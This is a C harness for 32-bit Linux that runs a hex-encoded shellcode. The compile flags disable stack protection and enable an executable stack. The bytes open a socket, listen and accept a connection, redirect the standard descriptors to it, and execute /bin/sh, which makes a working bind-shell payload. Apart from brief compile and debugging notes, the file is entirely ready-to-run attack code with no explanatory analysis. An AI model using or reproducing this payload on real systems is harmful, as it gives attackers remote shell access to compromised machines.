#include<stdio.h>
#include<string.h>

/*

Compilation: gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
Execution: ./shellcode

Notes: You can start analyzing the shellcode by setting up a breakpoint at shellcode variable.

*/

unsigned char shellcode[] =  "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80"
			     "\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80"
			     "\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f"
			     "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80";

main()
{
	
	printf("Shellcode length: %d\n",strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();
	
}
